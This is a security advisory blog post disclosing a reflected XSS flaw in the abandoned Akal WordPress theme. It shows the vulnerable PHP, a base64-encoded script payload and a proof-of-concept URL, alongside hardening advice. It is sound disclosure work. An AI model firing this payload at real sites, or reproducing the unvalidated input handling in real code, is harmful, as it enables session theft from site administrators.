=== Content from www.saotn.org_0c5fb08f_20250124_125830.html ===


[Sysadmins of the North](/)
Menu

* [Saotn](/pages/saotn)
* [About](/pages/about)
* [Donate](/pages/donate)
* [Posts](/posts)
* [Tags](/tags)

# WordPress advisory Akal premium theme XSS vulnerability

Over the course of one week I had the opportunity to audit two hacked WordPress websites. I could quickly discover two vulnerabilities, a Cross Site Scripting, or XSS, in a premium WordPress theme Akal, and a Denial-of-Service in an undisclosed newsletter plugin.
Published on Monday, 22 August 2016
 [cross-site-scripting](/tags/cross-site-scripting)
 [wordpress](/tags/wordpress)
 [xss](/tags/xss)

Share this post

[Twitter](https://twitter.com/share?url=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability&text=WordPress advisory Akal premium theme XSS vulnerability&via=Jan_Reilink)
[Facebook](https://www.facebook.com/sharer/sharer.php?u=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability)
[Reddit](https://reddit.com/submit?url=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability&title=)
[Hacker News](https://news.ycombinator.com/submitlink?u=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability&t=)
[LinkedIn](https://www.linkedin.com/shareArticle?url=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability&title=)
Email

This post describes the Akal premium WordPress theme XSS vulnerability. I have to be honest, I'm not familiar with the Akal theme, it is removed from Themeforest and seems abandoned. Therefore I'm unable to come up with quick fixes or patches as they might break the theme completely. If you use this theme, please delete it immediately!

## Akal premium WordPress theme Cross Site Scripting (XSS) vulnerability

The theme Akal is already [pulled](https://themeforest.net/item/akal-multipurpose-wordpress-theme/8836141) from ThemeForest, it looks like the theme author stopped this project. Since no updates are to be expected, my advice is to abandon this theme for your website if you use it.

The theme suffers from a reflected Cross Site Scripting (XSS) vulnerability that would allow an attacker to steal an admin's cookie, if WordPress wasn't secured against that type of attacks. Some information on that is available in my [prettyPhoto XSS](/posts/prettyphoto-dom-based-xss) post from May 2014. However, you must be careful for the [XSS watering hole](http://brutelogic.com.br/blog/reflected-watering-hole/)-effect.

The vulnerable code is located in `framework/brad-shortcodes/tinymce/preview.php`:

```
<?php

// loads wordpress
require_once('get_wp.php'); // loads wordpress stuff

// gets shortcode
$shortcode = base64_decode( trim( $_GET['sc'] ) );

?>
<!-- -->
</style>
</head>
<body>
<?php echo do_shortcode( $shortcode ); ?>
</body>
</html>

```

There are so many wrongs in these few lines of PHP code. One is the contents of `get_wp.php` (see below) and the other is this code:

```
$shortcode = base64_decode( trim( $_GET['sc'] ) );

```

This uses an unvalidated `$_GET` input directly into a variable `$shortcode`, and is then used in the WordPress function `do_shortcode()`. So now I'm interested in the file `get_wp.php` contents:

```
<?php

$absolute_path = __FILE__;
$path_to_file = explode( 'wp-content', $absolute_path );
$path_to_wp = $path_to_file[0];

// Access WordPress
require_once( $path_to_wp . '/wp-load.php' );

?>

```

This simply loads `wp-load.php` and thus all of WordPress' code. Without any validation whether the file was included correctly. Meaning you can call it directly in your browser.

If needed, always test whether the requested file was included correctly, for example use in your scripts:

```
if ( ! defined( 'ABSPATH' ) ) {
  exit;
}

```

Or:

```
if ( ! defined( 'YOUR_CONSTANT' ) ) {
  exit;
}

```

And use [Nonces](https://developer.wordpress.org/plugins/security/nonces/) in WordPress and make sure [Apache Access Control is correctly implemented](/posts/wordpress-htaccess-security-best-practices-apache-24) in your `.htaccess` files.

In this particular case, WordPress' [do\_shortcode()](https://developer.wordpress.org/reference/functions/do_shortcode/) provides no additional security. In the developers documentation we find the source, and the relevant part is on lines 205 - 207:

```
if ( false === strpos( $content, '[' ) ) {
  return $content;
}

```

If no `'['` is provided in `$content`, then simply return `$content`.

Knowing that, as long as we don't provide a `'['` our XSS payload is returned, we can start attacking it. You must have seen `$shortcode = base64_decode( trim( $_GET['sc'] ) );`, so our input has to be base64 encoded.

No problem there, just use [bash](/tags/bash) :-) .

After a few tries I came up with the following XSS-payload, that successfully alerted me of the XSS:

```
echo -n '<script>alert("xss </script%3E")</script>' | base64
PHNjcmlwdD5hbGVydCgieHNzIDwvc2NyaXB0JTNFIik8L3NjcmlwdD4=

```

PoC URL:

```
http://example.com/wp-content/themes/akal/framework/brad-shortcodes/tinymce/preview.php?sc=PHNjcmlwdD5hbGVydCgieHNzIDwvc2NyaXB0JTNFIik8L3NjcmlwdD4=

```

I've tried to contact the theme author [bradweb](https://themeforest.net/user/bradweb) but all links are dead ends. I haven't check for other vulnerabilities in this theme yet.

Looking for a [WordPress Plugin Security Tersting Cheat Sheet](https://github.com/ethicalhack3r/wordpress_plugin_security_testing_cheat_sheet)? [Ryan Dewhurst](https://dewhurstsecurity.com/) created one, use it wisely!

WPScan Vulnerability Database ID: [8607](https://wpvulndb.com/vulnerabilities/8607).

Share this post

[Twitter](https://twitter.com/share?url=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability&text=WordPress advisory Akal premium theme XSS vulnerability&via=Jan_Reilink)
[Facebook](https://www.facebook.com/sharer/sharer.php?u=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability)
[Reddit](https://reddit.com/submit?url=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability&title=)
[Hacker News](https://news.ycombinator.com/submitlink?u=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability&t=)
[LinkedIn](https://www.linkedin.com/shareArticle?url=https://www.saotn.org/posts/wordpress-advisory-akal-theme-xss-vulnerability&title=)
Email

---

[![Computer](http://bannersimages.s-bol.com/Category_Computer-affiliate_banner-728x90.png)](https://partner.bol.com/click/click?p=1&t=url&s=1294251&url=https%3A%2F%2Fwww.bol.com%2Fnl%2Fnl%2Fsf%2Fcomputer%2F&f=BAN&name=Computer&subid=)![Computer](https://partner.bol.com/click/impression?p=1&s=1294251&t=url&f=BAN&name=Computer&subid=)

Copyright © 2024 - Jan Reilink

- Donate via [Paypal](https://paypal.me/jreilink "Donate") or direct bank wire-transfer IBAN: NL31 ABNA 0432217258 (Jan Reilink)

* [RSS Feed](/feed.rss)
* [Atom Feed](/feed.atom)


